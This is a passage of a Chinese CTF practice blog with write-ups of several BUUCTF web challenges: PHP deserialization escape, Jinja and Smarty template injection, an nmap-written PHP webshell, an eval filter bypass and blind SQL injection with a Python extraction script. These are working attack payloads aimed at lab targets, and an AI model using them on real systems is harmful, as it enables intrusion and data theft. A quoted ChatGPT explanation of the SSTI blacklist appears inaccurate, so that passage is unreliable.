preg_replace($filter,&#x27;&#x27;,$img);&#125;if($_SESSION)&#123; unset($_SESSION);&#125;$_SESSION[&quot;user&quot;] = &#x27;guest&#x27;;$_SESSION[&#x27;function&#x27;] = $function;extract($_POST);if(!$function)&#123; echo &#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;;&#125;if(!$_GET[&#x27;img_path&#x27;])&#123; $_SESSION[&#x27;img&#x27;] = base64_encode(&#x27;guest_img.png&#x27;);&#125;else&#123; $_SESSION[&#x27;img&#x27;] = sha1(base64_encode($_GET[&#x27;img_path&#x27;]));&#125;$serialize_info = filter(serialize($_SESSION));if($function == &#x27;highlight_file&#x27;)&#123; highlight_file(&#x27;index.php&#x27;);&#125;else if($function == &#x27;phpinfo&#x27;)&#123; eval(&#x27;phpinfo();&#x27;); //maybe you can find something in here!&#125;else if($function == &#x27;show_image&#x27;)&#123; $userinfo = unserialize($serialize_info); echo file_get_contents(base64_decode($userinfo[&#x27;img&#x27;]));&#125; 代码审计 1234567$function = @$_GET[&#x27;f&#x27;];function filter($img)&#123; $filter_arr = array(&#x27;php&#x27;,&#x27;flag&#x27;,&#x27;php5&#x27;,&#x27;php4&#x27;,&#x27;fl1g&#x27;); $filter = &#x27;/&#x27;.implode(&#x27;|&#x27;,$filter_arr).&#x27;/i&#x27;; return preg_replace($filter,&#x27;&#x27;,$img);&#125; implode('|', $filter_arr) ：这个函数调用将 $filter_arr 中的元素连接成一个字符串，用 | （在正则表达式中代表 “或” 操作符）分隔。 preg_replace() 函数执行一个正则表达式的搜索和替换，将 'php','flag','php5','php4','fl1g' 替换成空格 123456789101112131415161718if($_SESSION)&#123; unset($_SESSION);&#125;$_SESSION[&quot;user&quot;] = &#x27;guest&#x27;;$_SESSION[&#x27;function&#x27;] = $function;extract($_POST);if(!$function)&#123; echo &#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;;&#125;if(!$_GET[&#x27;img_path&#x27;])&#123; $_SESSION[&#x27;img&#x27;] = base64_encode(&#x27;guest_img.png&#x27;);&#125;else&#123; $_SESSION[&#x27;img&#x27;] = sha1(base64_encode($_GET[&#x27;img_path&#x27;]));&#125; unset() 函数用于销毁给定的变量。 销毁后又重置 $_SESSION extract() 函数从数组中将变量导入到当前的符号表。看的是这个师傅的 wp：https://www.cnblogs.com/h3zh1/p/12732336.html。 extract () 变量覆盖 根据 extract () 我们可以进行变量覆盖，当我们传入 SESSION [flag]=123 时，SESSION[&quot;user&quot;]和SESSION[&quot;user&quot;]和SESSION[&quot;user&quot;]和 SESSION [‘function’] 全部会消失。 只剩下_SESSION [flag]=123。 1234567&lt;?php$_SESSION[&quot;user&quot;] = &#x27;guest&#x27;;$_SESSION[&#x27;function&#x27;] = $function;var_dump($_SESSION);echo &quot;&lt;br/&gt;&quot;;extract($_POST);var_dump($_SESSION); function 的 value 是由 $_GET['f'] 传进来的当以 get 方法传入 img_path 的情况下， $_SESSION['img'] 为传入的 img_path 进行 base64 加密和 sha1 加密 12345678if($function == &#x27;highlight_file&#x27;)&#123; highlight_file(&#x27;index.php&#x27;);&#125;else if($function == &#x27;phpinfo&#x27;)&#123; eval(&#x27;phpinfo();&#x27;); //maybe you can find something in here!&#125;else if($function == &#x27;show_image&#x27;)&#123; $userinfo = unserialize($serialize_info); echo file_get_contents(base64_decode($userinfo[&#x27;img&#x27;]));&#125; 如果 function 参数为 phpinfo 则回显 phpinfo() ，注释又告诉我们可以在其中找到一些东西，那就让 f=phpinfo 找到可疑文件 d0g3_f1ag.php 通过代码审计，我们要想获得 flag，需要改变 img_path 的内容或者直接改变 userinfo['img'] 来读取 flag 文件 这里看别的师傅的 wp，这一题要用到反序列化逃逸，参考 wp：https://blog.csdn.net/m0_62879498/article/details/124644325，https://www.cnblogs.com/h3zh1/p/12732336.html 主要可以仔细看看后面的那一篇，写的很具体，记录一下。 反序列化逃逸的原理 在构造键值的时候被过滤掉了，但序列化后的字符串记录的长度不会因为过滤而改变，所以就会把序列化后的字符串的结构当做值的内容给读取。 如果我们自己构造出反序列化字符串的结构，并因为过滤破坏掉原来的结构，就可以构造出恶意代码。 直接改 userinfo['img'] 反序列化字符逃逸的两种方法：键值逃逸，键名逃逸 键值逃逸： 这里先看一个正规的序列化字符串 1234#正规序列化的字符串&quot;a:2:&#123;s:3:&quot;one&quot;;s:4:&quot;flag&quot;;s:3:&quot;two&quot;;s:4:&quot;test&quot;;&#125;&quot;;#带有多余的字符的字符串&quot;a:2:&#123;s:3:&quot;one&quot;;s:4:&quot;flag&quot;;s:3:&quot;two&quot;;s:4:&quot;test&quot;;&#125;;s:3:&quot;真的垃圾img&quot;;lajilaji&quot;; a:2:&#123;s:3:&quot;one&quot;;s:4:&quot;flag&quot;;s:3:&quot;two&quot;;s:4:&quot;test&quot;;&#125; 拿着一串序列化字符串来说，a 代表数组，2 代表有两个键值分别是 one 和 two，他们对应的值 flag 和 test 决定 s:4:&quot;flag&quot; 中的数字，这个数字是字符 flag 和 test 的长度，以此类推 one 和 two 前面的 3 也是他们的长度，其中 s 是代表字符串。 如果字符串多出了或者少了会是什么情况，原理：因为序列化后的字符串是严格的，对应的格式不能错，比如 s:4:&quot;name&quot; , 那 s:4 就必须有一个字符串长度是 4 的否则就往后要，比如说 s:4:&quot;flag&quot; ，如果变成 s:5 ，那么对应的值会从 flag 变成 flag&quot; 。并且 unserialize 会把多余的字符串当垃圾处理，在花括号内的就是正确的，花括号后面的就都被扔掉。上述带有多余的字符串经过反序列化之后得到的会是 &quot;a:2:&#123;s:3:&quot;one&quot;;s:4:&quot;flag&quot;;s:3:&quot;two&quot;;s:4:&quot;test&quot;;&#125;&quot; 。 如果我们传入的序列化字符串内容敏感被过滤了会发生什么情况，在这一题内，flag 和 php 等敏感字符被过滤，我们如果传入 a:3:&#123;s:4:&quot;user&quot;;s:24:&quot;flagflagflagflagflagflag&quot;;s:8:&quot;function&quot;;s:59:&quot;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125; ，被过滤之后变成 a:3:&#123;s:4:&quot;user&quot;;s:24:&quot;&quot;;s:8:&quot;function&quot;;s:59:&quot;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125; 此时解读反序列化后会怎么样，a 由三个键值， s:4:&quot;user&quot; ，得到 user 键值，对应的属性值由于被过滤了，所以出现 s:24:&quot;&quot; 情况，但是根据序列化和反序列化的格式他会继续往后读取 24 个字符作为 user 的属性值，因此 user 属性值为 &quot;;s:8:&quot;function&quot;;s:59:&quot;a ，然后 s:3:&quot;img&quot; ，参数 img 正常读取， s:2:&quot;dd&quot; 参数 dd 正常读取，多余的部分为 ;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125; 直接舍弃。 知道了原理，我们就可以结合源码构造 payload， 12345678910$serialize_info = filter(serialize($_SESSION));if($function == &#x27;highlight_file&#x27;)&#123; highlight_file(&#x27;index.php&#x27;);&#125;else if($function == &#x27;phpinfo&#x27;)&#123; eval(&#x27;phpinfo();&#x27;); //maybe you can find something in here!&#125;else if($function == &#x27;show_image&#x27;)&#123; $userinfo = unserialize($serialize_info); echo file_get_contents(base64_decode($userinfo[&#x27;img&#x27;]));&#125; $serialize_info 是序列化的 $_SESSION ，在下面又把 $serialize_info 反序列化了，在这里我们就可以利用漏洞，构造一个序列化前的一个参数包含有序列化了的 img 参数 123456&lt;?php$_SESSION[&#x27;flagphp&#x27;] = &quot;;s:1:\\&quot;1\\&quot;;s:3:\\&quot;img\\&quot;;s:20:\\&quot;ZDBnM19mMWFnLnBocA==\\&quot;;&#125;&quot;;$_SESSION[&#x27;img&#x27;] = base64_encode(&#x27;guest_img.png&#x27;);echo serialize($_SESSION);?&gt;#a:2:&#123;s:7:&quot;flagphp&quot;;s:48:&quot;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125; 解读一下 a 两个键值 flagphp 经过 filter 过滤，直接为空，所以参数变为 &quot;;s:48: ，值为 s:1:&quot;1&quot; ，然后就到了第二个参数 img，这个 img 是我们直接构造的， ZDBnM19mMWFnLnBocA== 是 d0g3_f1ag.php 的 base64 编码，读取完之后剩下的字符串直接丢弃，这样就可已通过 file_get_contents(base64_decode($userinfo['img'])); 源码内的函数输出 d0g3_f1ag.php 所以这里只需要我们 post 一个新值 _SESSION['flagphp']=;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125; 其他的序列化反序列化操作都交给源码去做，这里可以把 php 的格式删掉，同时别忘了 get 传参 show_image 才能进入反序列化和输出的函数 页面没有直接显示但是 f12 或者查看页面源代码就可以获得如下信息： 12345&lt;?php$flag = &#x27;flag in /d0g3_fllllllag&#x27;;?&gt; 好家伙还有一层 /d0g3_fllllllag 拿去 base64 加密之后 L2QwZzNfZmxsbGxsbGFn 刚好 20 位，直接替换刚刚 payload 中 img 的内容 1234# GET?f=show_image# POST_SESSION[&#x27;flagphp&#x27;]=;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;L2QwZzNfZmxsbGxsbGFn&quot;;&#125; 拿到 flag，flag # [MRCTF2020]PYWebsite 本题进去之后就是各种写着付款，穷学生没钱付款，Buy It Now 还真有个二维码，不过这个二维码不是付款，而是提示我们好好分析代码，查看网页源代码 这里存在一个判断，如果相等就回显 flag.php 尝试能不能直接访问 flag.php 嗯？哈哈哈。保存了购买者的 IP，除了购买者和我自己看得了，那就是没有保存自己的 IP，通过本地访问？尝试 XFF 伪造本地 IP 1X-Forwarded-For: 127.0.0.1 下面两行空白的不能少，得到 flag，flag # [WesternCTF2018]shrine 题目给了源码 本题涉及的是 SSTI 注入，在源代码中有 一个 safe_jinjia ，就知道这是 jinjia 模板引擎，有哪些引擎啥的可以去 buu 刷题 3 找找我记得是写在那边的 分析源码可以看到本题有两个路由，第一个是 @app.route('/') ，显示源代码，第二个是 @app.route('/shrine/&lt;path:shrine&gt;') ，要在 /shrine/ 路径下提交参数，同时有个黑名单，过滤了 config 和 self。 如果没有黑名单的时候，我们可以使用 config ，传入 config ，或者使用 self ，传入 &#123;&#123;self.__dict__&#125;&#125; 当 config , self , () 都被过滤的时候，为了获取讯息，我们需要读取一些例如 current_app 这样的全局变量。 这道题还用上了 python 的沙箱逃逸的方法，又是一个陌生的知识点。。。 利用python对象之间的引用关系来调用被禁用的函数对象 ，留个我看的沙箱逃逸的链接：https://blog.csdn.net/calmegm/article/details/97390756 回到题目，先测试一下是否存在 SSTI 注入 1/shrine/&#123;&#123;2+5&#125;&#125; 可以看到存在 SSTI 注入，因为本题是 python 代码，就可以使用 python 自带的函数进行注入， url_for 构造 url，接受函数名作为第一个参数 查了一下 url_for () 的作用： 如果我们在视图函数中想使用一个 url，比如给前端返回，或者我们在这个视图函数中返回一个模板文件都会使用到 url，url 相当于一把钥匙可以开启一些资源。如果你修改了注册路由编写的 url 规则，相当于修改了钥匙。那么其他的视图函数依旧是使用了原来的钥匙就无效了，如果项目是一个大项目，你一点点手动的去改涉及到的的 url 就不合理了。url_for () 就是用来解决这个问题的。 get_flashed_message() 是通过 flash() 传入闪现信息列表的，能够把字符串对象表示的信息加入到一个消息列表，然后通过调用 get_flashed_message() 来取出。 构造 payload： 1/shrine/&#123;&#123;url_for.__globals__&#125;&#125; current_app 是当前使用的 app，获取当前 app 的 config 1/shrine/&#123;&#123;url_for.__globals__[&#x27;current_app&#x27;].config&#125;&#125; 得到 flag，flag 或者也可以使用 1/shrine/&#123;&#123;get_flashed_messages.__globals__[&#x27;current_app&#x27;].config&#125;&#125; 效果是一样的 对这种类型的题目还是很陌生，还需要沉淀，存在一个疑惑，就是函数内明明黑名单 config 了为什么这些 payload 的 config 没有被过滤？chatgpt 了一下，得到如下回答： 在这段代码中， url_for.__globals__['current_app'].config 这部分是一个完整的表达式，会被 Jinja 解释器解析为 Python 代码。然而，在你给出的 safe_jinja 函数中，并没有对这样的表达式进行解析或执行，因此黑名单并不会影响到它。 safe_jinja 函数中的黑名单主要针对字符串 s 中直接出现的特定单词进行过滤，而不涉及表达式的解析。因此，如果直接在 s 中包含了 'config' 或 'self' 这样的字符串，它们会被替换成 None ，但如果在表达式中间嵌入了这些关键词，那么它们就不会受到影响。 大概能懂了！ # [ASIS 2019]Unicorn shop 打开页面 随便输入一个 id 看看会是什么情况，输入 1 回显了这个，可以看到有一个函数对 price 做了一个操作，查询一下 unicodedata.numeric() unicodedata.numeric() 函数是用来获取 Unicode 字符的数值属性的。Unicode 是一种用来表示文本字符的标准，每个字符都有一个唯一的数字编码。这个函数可以用来查找给定字符的数值属性，比如数字、小数、分数等。 那我们尝试购买吧，试了一下 1、2、3 都是不可以获得什么信息的 在尝试 4 的时候出现了提示，输入 ID4，Price1337，提示 only one char，只能一个字符，可以用 https://www.compart.com/en/unicode 查询一个 unicodedata.numeric() 之后比 1337 更大的数 直接查找 two thousand 复制其中的一个，我选的是第一个 尝试购买 id4 购买成功，得到 flag，flag # [网鼎杯 2020 朱雀组] Nmap 输入 127.0.0.1 看看先 其中 to list 回显了路径，那就想到一句话木马 题目提到 nmap 就想到 - oG，之前做过一题也是 nmap 的 [BUUCTF 2018] Online Tool，写在 buu 刷题 3 里了 这里尝试一下能不能使用 | 或者 ; 被转义了，用分号试试看 不行，之前有做过一道 nmap 的题目在 buuctf 刷题 3 Online Tool 把 payload 拿过来用一下 1&#x27; &lt;?php @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.php &#x27; 有过滤？试试修改一些关键字比如 php，把 php 改成 phtml 再试试 1&#x27; &lt;?= @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.phtml&#x27; 可以，没有过滤，那就加上地址扫描 1127.0.0.1 | &#x27; &lt;?= @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.phtml&#x27; 看看 list 的路径 应该是和 list.php 一个路径下的，直接访问 蚁剑链接 最高一级目录找到 flag 文件 # [NPUCTF2020]ReadlezPHP f12 先查看源码 发现 href=&quot;./time.php?source&quot; ，存在 time.php ，访问看看 12345678910111213141516171819202122232425&lt;?php#error_reporting(0);class HelloPhp&#123; public $a; public $b; public function __construct()&#123; $this-&gt;a = &quot;Y-m-d h:i:s&quot;; $this-&gt;b = &quot;date&quot;; &#125; public function __destruct()&#123; $a = $this-&gt;a; $b = $this-&gt;b; echo $b($a); &#125;&#125;$c = new HelloPhp;if(isset($_GET[&#x27;source&#x27;]))&#123; highlight_file(__FILE__); die(0);&#125;@$ppp = unserialize($_GET[&quot;data&quot;]); 审计一下代码，最关键的就是 12345public function __destruct()&#123; $a = $this-&gt;a; $b = $this-&gt;b; echo $b($a); &#125; 就是构造成b(b(b(a) 形式的函数了，常见的就是 system () 形式 这里尝试 system 和 phpinfo 尝试获取一点信息 1time.php?data=O:8:&quot;HelloPhp&quot;:2:&#123;s:1:&quot;a&quot;;s:9:&quot;phpinfo()&quot;;s:1:&quot;b&quot;;s:6:&quot;system&quot;;&#125; 但是没能回显 phpinfo，猜测一般遇到这种形式，system 都会被过滤，把 system 换成 assert 试试看 1time.php?data=O:8:&quot;HelloPhp&quot;:2:&#123;s:1:&quot;a&quot;;s:9:&quot;phpinfo()&quot;;s:1:&quot;b&quot;;s:6:&quot;assert&quot;;&#125; 确实，在 phpinfo 看到 system 被禁用了 可以在 phpinfo 里面直接找到 flag flag # [CISCN2019 华东南赛区] Web11 网页最下面一行写着 Build With Smarty ! 猜测存在 SSTI 注入，在哪里存在注入？先抓包看看 XFF？ 找到注入点，另外提一嘴，Smarty 注入模板根据版本不一样 1、 &#123;php&#125;&#123;/php&#125; : Smarty 支持使用 {php}{/php} 标签来执行被包裹其中的 php 指令，最常规的思路自然是先测试该标签。 &#123;php&#125;phpinfo()&#123;/php&#125; 在 Smarty 3.1，{php} 仅在 SmartyBC 中可用。 2、{} 直接输入 php 命令，如： &#123;system('ls')&#125; 这里直接 &#123;system(ls)&#125; &#123;system('ls /')&#125; 查看上一级目录 1X-Forwarded-For: &#123;system(&#x27;ls /&#x27;)&#125; cat flag 1X-Forwarded-For: &#123;system(&#x27;cat /flag&#x27;)&#125; flag # [SWPU2019]Web1 先注册一个账号，登录后有两个链接一个是申请发布广告，另一个是注销登录，那就尝试申请发布广告 申请一个 广告详情 id？sql 注入？再申请一个广告看看 那可以看到第二个申请的广告 id 为 2，应该是根据 id 从数据库内提取出广告名、内容 这一题的注入点是在广告申请那边，尝试注入 11&#x27; order by 1# 回显 标题含有敏感词汇 ，存在过滤，一般常见的过滤就是 空格 、 order 、 # 等等，确实看了别的师傅的 wp， 空格、or、#、--+、and 都被过滤了。 修改一下代码 11&#x27;/**/group/**/by/**/1,&#x27; 修改后成功，查看广告详情可以得到一些信息 继续测试看看由几个字段 直到第 23 个字段 11&#x27;/**/group/**/by/**/23,&#x27; 出现 Unknown column '23' in 'group statement' ，所以可以知道总共有 22 个字段 unionselect 联合注入看看回显哪几个字段 11&#x27;/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#x27; 回显字段为 2 和 3，那就获取当前数据库 11&#x27;/**/union/**/select/**/1,database(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#x27; 数据库为 web1 ，获取表名，但是 information_schema 含有 or，or 被过滤，因此也无法使用。所以这里只能采用 innodb_index_stats 和 innodb_table_stats 来进行绕过。 爆表 11&#x27;/**/union/**/select/**/1,(group_concat(table_name)),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/from/**/mysql.innodb_table_stats/**/where/**/database_name=&quot;web1&quot;&#x27; 得到表名为 ads 和 users，但是 information_schema 不能使用，这里就要用到无字段名爆值，学习链接：https://blog.csdn.net/m0_46230316/article/details/106668182 在尝试之后得到 flag 在 users 表的第三列 payload 11&#x27;/**/union/**/select/**/1,database(),(select/**/group_concat(b)/**/from/**/(select/**/1,2/**/as/**/a,3/**/as/**/b/**/union/**/select/**/*/**/from/**/users)a),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#x27; select group_concat(b) 就是查询 users 表第三列。 得到 flag # [CISCN 2019 初赛] Love Math 12345678910111213141516171819202122232425262728 &lt;?phperror_reporting(0);//听说你很喜欢数学，不知道你是否爱它胜过爱flagif(!isset($_GET[&#x27;c&#x27;]))&#123; show_source(__FILE__);&#125;else&#123; //例子 c=20-1 $content = $_GET[&#x27;c&#x27;]; if (strlen($content) &gt;= 80) &#123; die(&quot;太长了不会算&quot;); &#125; $blacklist = [&#x27; &#x27;, &#x27;\\t&#x27;, &#x27;\\r&#x27;, &#x27;\\n&#x27;,&#x27;\\&#x27;&#x27;, &#x27;&quot;&#x27;, &#x27;`&#x27;, &#x27;\\[&#x27;, &#x27;\\]&#x27;]; foreach ($blacklist as $blackitem) &#123; if (preg_match(&#x27;/&#x27; . $blackitem . &#x27;/m&#x27;, $content)) &#123; die(&quot;请不要输入奇奇怪怪的字符&quot;); &#125; &#125; //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp $whitelist = [&#x27;abs&#x27;, &#x27;acos&#x27;, &#x27;acosh&#x27;, &#x27;asin&#x27;, &#x27;asinh&#x27;, &#x27;atan2&#x27;, &#x27;atan&#x27;, &#x27;atanh&#x27;, &#x27;base_convert&#x27;, &#x27;bindec&#x27;, &#x27;ceil&#x27;, &#x27;cos&#x27;, &#x27;cosh&#x27;, &#x27;decbin&#x27;, &#x27;dechex&#x27;, &#x27;decoct&#x27;, &#x27;deg2rad&#x27;, &#x27;exp&#x27;, &#x27;expm1&#x27;, &#x27;floor&#x27;, &#x27;fmod&#x27;, &#x27;getrandmax&#x27;, &#x27;hexdec&#x27;, &#x27;hypot&#x27;, &#x27;is_finite&#x27;, &#x27;is_infinite&#x27;, &#x27;is_nan&#x27;, &#x27;lcg_value&#x27;, &#x27;log10&#x27;, &#x27;log1p&#x27;, &#x27;log&#x27;, &#x27;max&#x27;, &#x27;min&#x27;, &#x27;mt_getrandmax&#x27;, &#x27;mt_rand&#x27;, &#x27;mt_srand&#x27;, &#x27;octdec&#x27;, &#x27;pi&#x27;, &#x27;pow&#x27;, &#x27;rad2deg&#x27;, &#x27;rand&#x27;, &#x27;round&#x27;, &#x27;sin&#x27;, &#x27;sinh&#x27;, &#x27;sqrt&#x27;, &#x27;srand&#x27;, &#x27;tan&#x27;, &#x27;tanh&#x27;]; preg_match_all(&#x27;/[a-zA-Z_\\x7f-\\xff][a-zA-Z_0-9\\x7f-\\xff]*/&#x27;, $content, $used_funcs); foreach ($used_funcs[0] as $func) &#123; if (!in_array($func, $whitelist)) &#123; die(&quot;请不要输入奇奇怪怪的函数&quot;); &#125; &#125; //帮你算出答案 eval(&#x27;echo &#x27;.$content.&#x27;;&#x27;);&#125; 代码审计 1$whitelist = [&#x27;abs&#x27;, &#x27;acos&#x27;, &#x27;acosh&#x27;, &#x27;asin&#x27;, &#x27;asinh&#x27;, &#x27;atan2&#x27;, &#x27;atan&#x27;, &#x27;atanh&#x27;, &#x27;base_convert&#x27;, &#x27;bindec&#x27;, &#x27;ceil&#x27;, &#x27;cos&#x27;, &#x27;cosh&#x27;, &#x27;decbin&#x27;, &#x27;dechex&#x27;, &#x27;decoct&#x27;, &#x27;deg2rad&#x27;, &#x27;exp&#x27;, &#x27;expm1&#x27;, &#x27;floor&#x27;, &#x27;fmod&#x27;, &#x27;getrandmax&#x27;, &#x27;hexdec&#x27;, &#x27;hypot&#x27;, &#x27;is_finite&#x27;, &#x27;is_infinite&#x27;, &#x27;is_nan&#x27;, &#x27;lcg_value&#x27;, &#x27;log10&#x27;, &#x27;log1p&#x27;, &#x27;log&#x27;, &#x27;max&#x27;, &#x27;min&#x27;, &#x27;mt_getrandmax&#x27;, &#x27;mt_rand&#x27;, &#x27;mt_srand&#x27;, &#x27;octdec&#x27;, &#x27;pi&#x27;, &#x27;pow&#x27;, &#x27;rad2deg&#x27;, &#x27;rand&#x27;, &#x27;round&#x27;, &#x27;sin&#x27;, &#x27;sinh&#x27;, &#x27;sqrt&#x27;, &#x27;srand&#x27;, &#x27;tan&#x27;, &#x27;tanh&#x27;]; 这个白名单很关键，因为里面有一些解码函数，可以用来绕过一些过滤 另外，知识点 php 中可以把函数名通过字符串的方式传递给一个变量，通过此变量动态调用函数比如下面的代码会执行 system('cat /flag') 12$a=&#x27;system&#x27;;$a(&#x27;cat /flag&#x27;); 本题使用的传参是 1?c=($_GET[a])($_GET[b])&amp;a=system&amp;b=cat /flag 但是 _GET 、 a 和 b 不在白名单会被过滤，这里先把 a 和 b 替换成存在白名单的参数 1?c=($_GET[pi])($_GET[abs])&amp;pi=system&amp;abs=cat /flag 但是这里的_GET 没有办法替换，并且 [] 在黑名单里面 这就要去白名单里面找找能用的函数 先记录一下如何转换 _GET 1、 hex2bin() 函数 hex2bin 函数把十六进制值的字符串转换为 ASCII 字符。 这里 _GET 是 ASCII 字符，先转成十六进制 5f474554 hex2bin (‘5f474554’) 就是 _GET 但是 hex2bin (5f474554) 也全都不在白名单，所以也不可以直接用，会被下面的函数检测 1preg_match_all(&#x27;/[a-zA-Z_\\x7f-\\xff][a-zA-Z_0-9\\x7f-\\xff]*/&#x27;, $content, $used_funcs); base_convert() 函数在任意进制之间转换数字。 在各个进制中可以看到 36 进制是数字 + 小写字母，所以 hex2bin 可以当作 36 进制利用 base_convert() 十进制转 36 进制可以的刀函数 hex2bin 得到 hex2bin 的 10 进制为 37907361743，贴个网站 https://tool.lu/hexconvert/ 1base_convert(37907361743,10,36) #hex2bin 所以组合一下GET()就是‘_GET()就是`G​ET()就是‘base_convert(37907361743,10,36)(dechex(1598506324)) ， dechex(1598506324) 就是 5f474554` [] 被禁用可以用 &#123;&#125; 替代，所以构建 payload，先让 $pi=$base_convert(37907361743,10,36)(dechex(1598506324)) ，让 pi 的值为 _GET ，然后 ($$pi) 就是 $_GET，{} 替代 [] 得到 payload 1/?c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi)&#123;pi&#125;(($$pi)&#123;abs&#125;)&amp;pi=system&amp;abs=cat /flag 过滤只会对参数 c 过滤，pi 参数和 abs 参数躲开了函数的过滤 拿到 flag，flag # [极客大挑战 2019] FinalSQL 进入页面，选择神秘代码即可获得 flag，一个个看过去，看看能不能获得什么有用的信息，第五个说怎么看第六个，前五个页面是根据 id 的，直接让 id=6 Clever! But not this table. 不在这个表 注入点应该就是在 id，这里过滤了很多东西 union select 和报错注入的函数都被禁用了 判断一下是数字型注入还是字符型注入 123?id=1^1?id=1^0# 1^1=0,0^0=0,1^0=1 是数字型，构造 payload 盲注 123/search.php?id=1^(ascii(substr((select(group_concat(database()))),1,1))&gt;0)^1 #获取当前数据库名称/search.php?id=1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),1,1))&gt;0)^1 #爆表以此类推 1^...^1 : 这里使用异或运算对结果进行处理，异或一个固定值两次不会改变它的值。 写脚本 1234567891011121314151617181920212223242526272829303132import requestsimport timeurl = &quot;http://41bb05d0-bf55-4f82-9280-8e1aa6a0da1d.node5.buuoj.cn:81/search.php?id=&quot;i = 0flag = &#x27;&#x27;while True: i += 1 begin = 32 #ASCII可打印字符开始 end = 126 mid = (begin + end) // 2 while begin &lt; end: time.sleep(0.06) # 爆库 # payload = &quot;1^(ascii(substr((select(group_concat(database()))),%d,1))&gt;%d)^1&quot; % (i, mid) # 爆表 # payload = &quot;1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),%d,1))&gt;%d)^1&quot; % (i, mid) # 爆字段 # payload = &quot;1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;geek&#x27;)),%d,1))&gt;%d)^1&quot; %(i,mid) # 获取内容（flag） # payload = &quot;1^(ascii(substr((select(group_concat(password))from(F1naI1y)),%d,1))&gt;%d)^1&quot; %(i,mid) r = requests.get(url + payload) if &#x27;Click&#x27; in r.text: begin = mid + 1 else: end = mid mid = (begin + end) // 2 flag += chr(mid) print(flag) if begin == 32: break 最后得到 12345678当前数据库：geek表名：F1naI1y,Flaaaaag字段名：id,username,password,id,fl4gawsl按表爆内容（F1naI1y爆完就得到了）：cl4y_is_really_amazing,welcome_to_my_blog,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,http://www.cl4y.top,welcom_to_Syclover,cl4y_really_need_a_grilfriend,flag&#123;b8a4fbab-f13a-4ebe-a455-3256d476d6b0&#125; # [BSidesCF 2019]Kookie 本题的题目头和 Cookie 关联很大，点进去一看，登录，Login as admin，那就猜测构造 Cookie 登录 抓包，添加 Cookie 1Cookie: username=admin 得到 flag，flag # [BSidesCF 2019]Futurella 记录一下这个文字，很奇怪直接选择这个花括号的内容复制粘贴就是 flag 了，f12 也可以直接查看 flag # [De1CTF 2019]SSRF Me 打开看到代码，整理得到 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798#! /usr/bin/env python#encoding=utf-8from flask import Flaskfrom flask import requestimport socketimport hashlibimport urllibimport sysimport osimport jsonreload(sys)sys.setdefaultencoding(&#x27;latin1&#x27;) #置默认的string的编码格式app = Flask(__name__)secert_key = os.urandom(16)class Task: def __init__(self, action, param, sign, ip): self.action = action self.param = param self.sign = sign self.sandbox = md5(ip) if(not os.path.exists(self.sandbox)): #SandBox For Remote_Addr os.mkdir(self.sandbox) def Exec(self): result = &#123;&#125; result[&#x27;code&#x27;] = 500 if (self.checkSign()): if &quot;scan&quot; in self.action: tmpfile = open(&quot;./%s/result.txt&quot; % self.sandbox, &#x27;w&#x27;) resp = scan(self.param) if (resp == &quot;Connection Timeout&quot;): result[&#x27;data&#x27;] = resp else: print resp tmpfile.write(resp) tmpfile.close() result[&#x27;code&#x27;] = 200 if &quot;read&quot; in self.action: f = open(&quot;./%s/result.txt&quot; % self.sandbox, &#x27;r&#x27;) result[&#x27;code&#x27;] = 200 result[&#x27;data&#x27;] = f.read() if result[&#x27;code&#x27;] == 500: result[&#x27;data&#x27;] = &quot;Action Error&quot; else: result[&#x27;code&#x27;] = 500 result[&#x27;msg&#x27;] = &quot;Sign Error&quot; return result def checkSign(self): if (getSign(self.action, self.param) == self.sign): return True else: return False #generate Sign For Action Scan.@app.route(&quot;/geneSign&quot;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])def geneSign(): param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;)) action = &quot;scan&quot; return getSign(action, param)@app.route(&#x27;/De1ta&#x27;,methods=[&#x27;GET&#x27;,&#x27;POST&#x27;])def challenge(): action = urllib.unquote(request.cookies.get(&quot;action&quot;)) param = urllib.unquote(request.args.get(&quot;param&quot;, &quot;&quot;)) sign = urllib.unquote(request.cookies.get(&quot;sign&quot;)) ip = request.remote_addr if(waf(param)): return &quot;No Hacker!!!!&quot; task = Task(action, param, sign, ip) return json.dumps(task.Exec())@app.route(&#x27;/&#x27;)def index(): return open(&quot;code.txt&quot;,&quot;r&quot;).read()def scan(param): socket.setdefaulttimeout(1) try: return 